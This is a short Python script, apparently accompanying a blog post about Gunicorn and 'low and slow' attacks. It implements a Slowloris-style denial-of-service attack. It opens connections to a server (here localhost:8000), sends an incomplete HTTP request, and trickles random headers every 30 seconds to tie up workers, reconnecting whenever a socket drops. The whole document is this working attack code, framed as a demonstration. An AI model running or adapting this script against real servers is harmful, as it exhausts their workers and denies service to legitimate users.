"""
https://rushter.com/blog/gunicorn-and-low-and-slow-attacks/
"""

import random
import socket
import string
import time


def init_request(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    s.send(b"GET / HTTP/1.1\r\n")
    return s


ip = "localhost"
port = 8000

workers_count = 1
sockets = [init_request(ip, port) for _ in range(workers_count)]

while True:
    for i, s in enumerate(sockets):
        try:
            # check a connection by sending a random header
            header = "%s: %s\r\n" % (random.choice(string.ascii_letters), random.randint(1, 99999))
            s.send(header.encode('utf-8'))
        except socket.error:
            # recreate a dead socket
            sockets[i] = init_request(ip, port)
    time.sleep(30)
